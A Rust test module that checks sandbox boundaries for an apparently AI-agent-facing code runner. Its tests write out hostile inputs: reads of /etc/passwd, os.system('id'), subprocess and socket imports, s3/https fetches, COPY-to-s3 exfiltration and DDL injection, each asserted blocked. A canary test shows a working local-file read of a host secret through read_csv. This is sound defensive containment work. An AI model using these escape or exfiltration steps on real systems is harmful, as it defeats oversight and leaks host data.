//! Adversarial sandbox-boundary tests for the V1a agent surface (`Session::run_code`).
//!
//! Threat model: the agent program is HOSTILE. It will try to break out of the Monty sandbox,
//! reach the host OS, hit the network, write/exfiltrate data, and bypass the result cap. These
//! tests assert the protections V1a DOES enforce, and one test (`KNOWN_GAP_*`) documents the one
//! it does NOT yet enforce — arbitrary local-file read — which is closed at the load/connector
//! boundary (PRODUCT.md §6/§14; roadmap-replan V3). Every behavior here was probed empirically
//! before being asserted.

use crate::DropletError;
use crate::engine_duckdb::DEFAULT_MAX_RESULT_ROWS;
use crate::session::Session;
use monty::MontyObject;

/// A unique temp dir per test so fixtures never collide. Not the session work dir — `query` reads
/// any local path, which is exactly the surface under test.
fn tmp_dir(tag: &str) -> std::path::PathBuf {
    let dir = std::env::temp_dir().join(format!("droplet-sec-{tag}"));
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

/// Write a parquet from a SELECT via a throwaway connection (not the hardened session engine).
fn write_parquet(path: &str, select_sql: &str) {
    let conn = duckdb::Connection::open_in_memory().unwrap();
    conn.execute_batch(&format!("COPY ({select_sql}) TO '{path}' (FORMAT PARQUET)"))
        .unwrap();
}

/// A valid 1-row `sales` parquet the legitimate path can point at.
fn sales_parquet(dir: &std::path::Path) -> String {
    let p = dir.join("sales.parquet").to_str().unwrap().to_string();
    write_parquet(&p, "SELECT 'EU' AS region, CAST(1.0 AS DOUBLE) AS amt");
    p
}

fn list_len(v: &MontyObject) -> usize {
    match v {
        MontyObject::List(items) => items.len(),
        _ => 0,
    }
}

// --- Group A: Python-level host escapes are blocked by the Monty sandbox ------------------------

#[test]
fn python_host_escapes_are_blocked() {
    // None of these should reach the host: the Monty interpreter has no os/socket/subprocess, no
    // file `open`, no `eval`/`__import__`. Each must surface as an error, never silently succeed.
    let escapes = [
        ("import os", "import os\nos.getcwd()"),
        ("import socket", "import socket\nsocket.socket()"),
        (
            "import subprocess",
            "import subprocess\nsubprocess.run(['id'])",
        ),
        ("builtin open", "open('/etc/passwd').read()"),
        ("eval", "eval('1+1')"),
        ("exec", "exec('x=1')"),
        ("__import__", "__import__('os').system('id')"),
        ("read env", "import os\nos.environ.get('HOME')"),
    ];
    for (i, (label, code)) in escapes.iter().enumerate() {
        let mut s = Session::new(&format!("escape-{i}")).unwrap();
        assert!(
            s.run_code(code).is_err(),
            "sandbox must block host escape: {label}"
        );
    }
}

// --- Group B: network egress is blocked (no source/data plane reachable in analyze) -------------

#[test]
fn network_egress_is_blocked() {
    let dir = tmp_dir("net");
    let p = sales_parquet(&dir);
    // Remote paths and remote table functions must fail with NO network round-trip: httpfs/S3 are
    // never auto-installed/auto-loaded, and the filesystems are disabled on the connection
    // (invariant #3). They fail at the engine before any egress.
    let attempts = [
        (
            "s3 path arg",
            "query('s3://nope/x.parquet', 'SELECT * FROM data')".to_string(),
        ),
        (
            "https path arg",
            "query('https://example.com/x.parquet', 'SELECT * FROM data')".to_string(),
        ),
        (
            "read_csv over https in SQL",
            format!("query({p:?}, \"SELECT * FROM read_csv('https://example.com/a.csv')\")"),
        ),
        (
            "read_parquet over s3 in SQL",
            format!("query({p:?}, \"SELECT * FROM read_parquet('s3://nope/y.parquet')\")"),
        ),
    ];
    for (label, code) in attempts {
        let mut s = Session::new("net").unwrap();
        assert!(
            s.run_code(&code).is_err(),
            "network egress must be blocked: {label}"
        );
    }
    let _ = std::fs::remove_dir_all(&dir);
}

// --- Group C: only SELECT-shaped SQL runs — no DDL/PRAGMA/extension/COPY (write) escapes --------

#[test]
fn non_select_statements_and_writes_are_blocked() {
    let dir = tmp_dir("ddl");
    let p = sales_parquet(&dir);
    // `query` wraps the agent SQL in `CREATE VIEW ... AS (...)`, so anything that is not a single
    // SELECT-shaped query is a parser error. This structurally blocks extension loading, attaching
    // databases, PRAGMA introspection, and — crucially — any `COPY ... TO` data exfiltration/write.
    let attempts = [
        ("INSTALL httpfs", "INSTALL httpfs"),
        ("LOAD httpfs", "LOAD httpfs"),
        ("ATTACH db", "ATTACH 'x.db' AS y"),
        ("PRAGMA", "PRAGMA database_list"),
        (
            "SET enable_external_access",
            "SET enable_external_access=true",
        ),
        ("COPY TO s3", "COPY data TO 's3://nope/out.parquet'"),
        ("multi-statement DROP", "SELECT 1; DROP VIEW data"),
    ];
    for (label, sql) in attempts {
        let mut s = Session::new("ddl").unwrap();
        let code = format!("query({p:?}, {sql:?})");
        assert!(
            s.run_code(&code).is_err(),
            "non-SELECT statement must be blocked: {label}"
        );
    }
    // COPY to a local path is the same structural block (and the only file `query` could create).
    let mut s = Session::new("ddl-copy-local").unwrap();
    let leak = dir.join("leak.parquet");
    let code = format!(
        "query({p:?}, \"COPY data TO '{}'\")",
        leak.to_str().unwrap()
    );
    assert!(
        s.run_code(&code).is_err(),
        "COPY TO local file must be blocked"
    );
    assert!(!leak.exists(), "no file may be written by a query");
    let _ = std::fs::remove_dir_all(&dir);
}

// --- Group D: dispatch + boundary discipline ----------------------------------------------------

#[test]
fn unregistered_host_function_errors_and_session_survives() {
    // A name that is not a #[droplet_tool] resolves to NotFound -> the sandbox raises, run_code errs.
    let mut s = Session::new("fakefn").unwrap();
    assert!(s.run_code("totally_not_a_tool(1)").is_err());
    assert!(
        s.run_code("query_secret(0)").is_err(),
        "no host function may be conjured by name"
    );
    // A recoverable agent error must NOT poison the session (no panic, no consumed REPL): a valid
    // program runs afterward against the same session.
    assert_eq!(s.run_code("1 + 2").unwrap(), MontyObject::Int(3));
}

#[test]
fn result_cap_bounds_one_boundary_crossing() {
    // Invariant #6: a single result that crosses into the sandbox is capped, so an agent cannot
    // pull an unbounded amount of host-side data in one call. 2500 rows -> exactly the cap.
    let dir = tmp_dir("cap");
    let big = dir.join("big.parquet").to_str().unwrap().to_string();
    write_parquet(&big, "SELECT * FROM range(2500)");
    let mut s = Session::new("cap").unwrap();
    let out = s
        .run_code(&format!("query({big:?}, 'SELECT * FROM data')"))
        .unwrap();
    assert_eq!(
        list_len(&out),
        DEFAULT_MAX_RESULT_ROWS,
        "the boundary read-out must be capped"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_bad_column_fails_loudly_not_silently() {
    // A query referencing a non-existent column must surface a real engine error (folded into
    // DropletError), not return empty/garbage — proving the SQL genuinely executes.
    let dir = tmp_dir("badcol");
    let p = sales_parquet(&dir);
    let mut s = Session::new("badcol").unwrap();
    let err = s
        .run_code(&format!("query({p:?}, 'SELECT nonesuch FROM data')"))
        .unwrap_err();
    assert!(matches!(err, DropletError::Duckdb(_)), "got {err:?}");
    let _ = std::fs::remove_dir_all(&dir);
}

// --- Group E: KNOWN GAP — arbitrary local-file read is NOT yet sandboxed -------------------------

/// CANARY (documents a known V1a limitation, not a passing protection).
///
/// V1a's `query` lets the agent supply both the parquet path AND arbitrary SELECT SQL, and the
/// local filesystem is deliberately NOT sandboxed (the engine must read the local parquet). So an
/// agent CAN read host files it was never given, via DuckDB table functions (`read_csv`/`read_blob`
/// /`glob`/…) — i.e. local-file exfiltration into the sandbox is currently possible.
///
/// This is closed at the LOAD/connector boundary (PRODUCT.md §6/§14; replan V3): the agent stops
/// passing paths, references logical datasets, and reads are scoped to host-controlled cache files.
///
/// Full writeup (threat model, blast radius, verified DuckDB fix recipe, acceptance criteria):
/// `docs/security/2026-06-24-v1a-local-fs-read-gap.md`.
///
/// This test asserts the CURRENT (vulnerable) behavior on purpose, so it FAILS LOUDLY the day
/// local-FS scoping lands — at which point flip it to assert the read is blocked.
#[test]
fn known_gap_local_file_read_is_currently_possible() {
    let dir = tmp_dir("exfil");
    let p = sales_parquet(&dir);
    // A "host secret" the agent was never handed a handle to.
    let secret = dir.join("secret.txt");
    std::fs::write(&secret, "TOPSECRET").unwrap();

    let mut s = Session::new("exfil").unwrap();
    let code = format!(
        "query({p:?}, \"SELECT * FROM read_csv('{}', header=false)\")",
        secret.to_str().unwrap()
    );
    let out = s
        .run_code(&code)
        .expect("KNOWN GAP: local read currently succeeds");

    // The host file's contents reached the agent — exfiltration. When V3 scopes local FS, the
    // run_code above will Err instead, this `expect` will fire, and we update the test.
    let leaked = format!("{out:?}");
    assert!(
        leaked.contains("TOPSECRET"),
        "KNOWN GAP canary: expected the host file contents to leak, got {leaked}"
    );
    let _ = std::fs::remove_dir_all(&dir);
}
